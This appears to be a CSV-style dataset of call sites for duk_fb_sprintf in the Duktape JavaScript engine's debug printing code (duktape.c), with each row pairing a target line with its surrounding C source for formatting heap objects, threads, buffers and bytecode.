2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf:"");
		duk__print_hbuffer(st, (duk_hbuffer *) b->buf);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");
		duk__print_hobject(st, (duk_hobject *) b->buf_prop);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");
		duk__print_hobject(st, (duk_hobject *) b->buf_prop);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);",120,1,"		duk__print_hobject(st, (duk_hobject *) b->buf_prop);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);
#endif
	} else if (st->internal && DUK_HOBJECT_IS_PROXY(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__target:"");",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_PROXY(h)) {
		duk_hproxy *p = (duk_hproxy *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:"");
		duk__print_hobject(st, p->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__handler:"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__handler:"");",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:"");
		duk__print_hobject(st, p->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__handler:"");
		duk__print_hobject(st, p->handler);
	} else if (st->internal && DUK_HOBJECT_IS_THREAD(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_THREAD(h)) {
		duk_hthread *t = (duk_hthread *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);",120,1,"		duk_hthread *t = (duk_hthread *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
#if defined(DUK_USE_INTERRUPT_COUNTER)
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
#if defined(DUK_USE_INTERRUPT_COUNTER)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
#if defined(DUK_USE_INTERRUPT_COUNTER)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_init:%ld"", (long) t->interrupt_init);
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_init:%ld"", (long) t->interrupt_init);",120,1,"#if defined(DUK_USE_INTERRUPT_COUNTER)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_init:%ld"", (long) t->interrupt_init);
#endif

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__refcount:%lu"", (unsigned long) DUK_HEAPHDR_GET_REFCOUNT((duk_heaphdr *) h));",120,1,"#if defined(DUK_USE_REFERENCE_COUNTING)
	if (st->internal) {
		DUK__COMMA(); duk_fb_sprintf(fb, ""__refcount:%lu"", (unsigned long) DUK_HEAPHDR_GET_REFCOUNT((duk_heaphdr *) h));
	}
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__class:%ld"", (long) DUK_HOBJECT_GET_CLASS_NUMBER(h));",120,1,"#endif
	if (st->internal) {
		DUK__COMMA(); duk_fb_sprintf(fb, ""__class:%ld"", (long) DUK_HOBJECT_GET_CLASS_NUMBER(h));
	}

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__heapptr:%p"", (void *) h);  */",120,1,"	}

	DUK__COMMA(); duk_fb_sprintf(fb, ""__heapptr:%p"", (void *) h);  /* own pointer */

	/* prototype should be last, for readability */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__prototype:%p"", (void *) DUK_HOBJECT_GET_PROTOTYPE(NULL, h));",120,1,"			DUK__COMMA(); duk_fb_put_cstring(fb, ""__prototype:""); duk__print_hobject(st, DUK_HOBJECT_GET_PROTOTYPE(NULL, h));
		} else {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__prototype:%p"", (void *) DUK_HOBJECT_GET_PROTOTYPE(NULL, h));
		}
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""u"");",120,1,"			}
			if (h_idx == DUK_HOBJECT_HASHIDX_UNUSED) {
				duk_fb_sprintf(fb, ""u"");
			} else if (h_idx == DUK_HOBJECT_HASHIDX_DELETED) {
				duk_fb_sprintf(fb, ""d"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""d"");",120,1,"				duk_fb_sprintf(fb, ""u"");
			} else if (h_idx == DUK_HOBJECT_HASHIDX_DELETED) {
				duk_fb_sprintf(fb, ""d"");
			} else {
				duk_fb_sprintf(fb, ""%ld"", (long) h_idx);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%ld"", (long) h_idx);",120,1,"				duk_fb_sprintf(fb, ""d"");
			} else {
				duk_fb_sprintf(fb, ""%ld"", (long) h_idx);
			}
		}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""buffer:external:%p:%ld"",",120,1,"		if (DUK_HBUFFER_HAS_EXTERNAL(h)) {
			duk_hbuffer_external *g = (duk_hbuffer_external *) h;
			duk_fb_sprintf(fb, ""buffer:external:%p:%ld"",
			               (void *) DUK_HBUFFER_EXTERNAL_GET_DATA_PTR(NULL, g),
			               (long) DUK_HBUFFER_EXTERNAL_GET_SIZE(g));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""buffer:dynamic:%p:%ld"",",120,1,"		} else {
			duk_hbuffer_dynamic *g = (duk_hbuffer_dynamic *) h;
			duk_fb_sprintf(fb, ""buffer:dynamic:%p:%ld"",
			               (void *) DUK_HBUFFER_DYNAMIC_GET_DATA_PTR(NULL, g),
			               (long) DUK_HBUFFER_DYNAMIC_GET_SIZE(g));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""buffer:fixed:%ld"", (long) DUK_HBUFFER_GET_SIZE(h));",120,1,"		}
	} else {
		duk_fb_sprintf(fb, ""buffer:fixed:%ld"", (long) DUK_HBUFFER_GET_SIZE(h));
	}

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""=["");",120,1,"
	if (st->hexdump) {
		duk_fb_sprintf(fb, ""=["");
		n = DUK_HBUFFER_GET_SIZE(h);
		p = (duk_uint8_t *) DUK_HBUFFER_GET_DATA_PTR(NULL, h);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%02lx"", (unsigned long) p[i]);",120,1,"		p = (duk_uint8_t *) DUK_HBUFFER_GET_DATA_PTR(NULL, h);
		for (i = 0; i < n; i++) {
			duk_fb_sprintf(fb, ""%02lx"", (unsigned long) p[i]);
		}
		duk_fb_sprintf(fb, ""]"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""]"");",120,1,"			duk_fb_sprintf(fb, ""%02lx"", (unsigned long) p[i]);
		}
		duk_fb_sprintf(fb, ""]"");
	}
}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""[unknown htype %ld]"", (long) DUK_HEAPHDR_GET_TYPE(h));",120,1,"		break;
	default:
		duk_fb_sprintf(fb, ""[unknown htype %ld]"", (long) DUK_HEAPHDR_GET_TYPE(h));
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""(%p)"", (void *) tv);",120,1,"
	if (st->heavy) {
		duk_fb_sprintf(fb, ""(%p)"", (void *) tv);
	}

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%02lx"", (unsigned long) ((duk_uint8_t *)tv)[i]);",120,1,"		duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_LBRACKET);
		for (i = 0; i < (duk_size_t) sizeof(*tv); i++) {
			duk_fb_sprintf(fb, ""%02lx"", (unsigned long) ((duk_uint8_t *)tv)[i]);
		}
		duk_fb_put_byte(fb, (duk_uint8_t) DUK_ASC_RBRACKET);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""pointer:%p"", (void *) DUK_TVAL_GET_POINTER(tv));",120,1,"	}
	case DUK_TAG_POINTER: {
		duk_fb_sprintf(fb, ""pointer:%p"", (void *) DUK_TVAL_GET_POINTER(tv));
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""lightfunc:"");",120,1,"
		DUK_TVAL_GET_LIGHTFUNC(tv, func, lf_flags);
		duk_fb_sprintf(fb, ""lightfunc:"");
		duk_fb_put_funcptr(fb, (duk_uint8_t *) &func, sizeof(func));
		duk_fb_sprintf(fb, "":%04lx"", (long) lf_flags);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, "":%04lx"", (long) lf_flags);",120,1,"		duk_fb_sprintf(fb, ""lightfunc:"");
		duk_fb_put_funcptr(fb, (duk_uint8_t *) &func, sizeof(func));
		duk_fb_sprintf(fb, "":%04lx"", (long) lf_flags);
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%.18g_F"", (double) DUK_TVAL_GET_NUMBER(tv));",120,1,"		DUK_ASSERT(!DUK_TVAL_IS_UNUSED(tv));
		DUK_ASSERT(DUK_TVAL_IS_NUMBER(tv));
		duk_fb_sprintf(fb, ""%.18g_F"", (double) DUK_TVAL_GET_NUMBER(tv));
		break;
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%.18g"", (double) DUK_TVAL_GET_NUMBER(tv));",120,1,"		DUK_ASSERT(!DUK_TVAL_IS_UNUSED(tv));
		DUK_ASSERT(DUK_TVAL_IS_NUMBER(tv));
		duk_fb_sprintf(fb, ""%.18g"", (double) DUK_TVAL_GET_NUMBER(tv));
		break;
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%s %ld (to pc%c%ld)"",",120,1,"		duk_int_t diff2 = diff1 + 1;                                          /* from curr pc */

		duk_fb_sprintf(fb, ""%s %ld (to pc%c%ld)"",
		               (const char *) op_name, (long) diff1,
		               (int) (diff2 >= 0 ? '+' : '-'),  /* char format: use int */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%s %ld, %ld, %ld"",",120,1,"		               (long) (diff2 >= 0 ? diff2 : -diff2));
	} else {
		duk_fb_sprintf(fb, ""%s %ld, %ld, %ld"",
		               (const char *) op_name, (long) DUK_DEC_A(ins),
		               (long) DUK_DEC_B(ins), (long) DUK_DEC_C(ins));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""?(%ld)"", (long) opcode);",120,1,"
	if (opcode < DUK_BC_OP_MIN || opcode > DUK_BC_OP_MAX) {
